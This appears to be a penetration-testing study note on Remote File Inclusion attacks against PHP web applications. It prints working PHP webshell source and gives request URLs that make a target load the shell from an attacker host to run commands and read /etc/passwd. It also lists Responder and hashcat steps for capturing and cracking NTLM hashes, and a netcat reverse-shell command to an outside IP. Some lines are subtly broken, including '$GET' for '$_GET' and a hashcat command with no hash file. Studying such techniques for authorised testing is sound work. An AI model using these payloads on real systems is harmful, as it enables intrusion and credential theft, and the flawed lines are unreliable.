Less common than LFI
Target must be configured in a specific way
	allow_url_include must be enabled (in php apps)

RFI allows us to include files from a remote system over HTTP or SMB

Kali includes PHP webshells natively 
	`/usr/share/webshells/php/

simple-backdoor.php code
```php
<?php
if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}
?>
```

another php webshell example
```php
<?php system ($GET["cmd"]) ?>
```
## Demonstration of RFI Attacks

#### Enumerating
HTTP Version:
```bash
# host server
python3 -m http.server 80

# visit
http://<target>.com/index.php?view=http://<kali_ip>/simple-backdoor.php?cmd=cat+/etc/passwd
```
You may need to view page source to see output in a legible manner

See [[LFI Path Traversal]] if you can get to this point

#### Stealing Hashes
We can potentially intercept user hashes if RFI is possible

```bash
# Start SMB Server
sudo responder -I tun0

# Connect to SMB server with web server (also try with BURP)
GET /index.php?view=//<kali_ip>/404

# Crack Net-NTLMv2 hash
hashcat -m 5600 /usr/share/wordlists/rockyou.txt
```

#### Reverse Shells
If we can perform an RFI, we can potentially get a reverse shell

Linux
```bash
# host server
python3 -m http.server 80

# one-liner
http://<target>.com/index.php?view=http://<kali_ip>/simple-backdoor.php?cmd=<reverse_shell_oneliners>
```
you may have to url encode to get it to work


Windows
```bash
# host server in location with nc64.exe AND webshell
python3 -m http.server 80

# one-liner
http://<target>.com/index.php?view=http://<kali_ip>/simple-backdoor.php?cmd=nc64.exe -e powershell.exe 10.10.10.10 9001
```
likewise you may need to url encode (%20 = spaces)
